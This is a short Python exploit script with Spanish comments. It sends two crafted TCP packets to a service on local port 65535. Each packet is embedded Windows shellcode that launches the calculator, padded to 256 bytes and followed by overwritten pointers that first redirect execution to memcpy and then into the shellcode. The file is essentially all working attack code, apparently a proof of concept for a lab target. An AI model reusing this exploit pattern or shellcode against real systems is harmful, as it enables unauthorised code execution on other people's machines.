#!/usr/bin/python

import socket
import binascii
from subprocess import Popen, PIPE
import struct

winexec_calc_shellcode = b'31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7'
winexec_calc_shellcode = binascii.unhexlify(winexec_calc_shellcode)

TCP_IP = socket.gethostname()
TCP_PORT = 65535
BUFFER_SIZE = 1024

shellcode = winexec_calc_shellcode + b"A" * ( 256 - len(winexec_calc_shellcode))

# Primera Parte
puntero_cpy = struct.pack("<L",0x00402458)        #Puntero controlado, _memcpy, para copiar la data en otro lugar que se pueda ejecutar.

pkt1 = shellcode + puntero_cpy

 #Enviamos 1 paquete
print("sending packet 2")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(pkt1)
data = s.recv(BUFFER_SIZE)
s.close()
print("packet 1 sent")

# Segunda Parte
puntero_shell = struct.pack("<L",0x0040A115)        #Puntero que puedo manejar, ejecutamos la shellcode de la calculadora

pkt2 = shellcode + puntero_shell

 #Enviamos 1 paquete
print("sending packet 2")
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.connect((TCP_IP, TCP_PORT))
s2.send(pkt2)
s2.close()
print("Exploit done !")




  

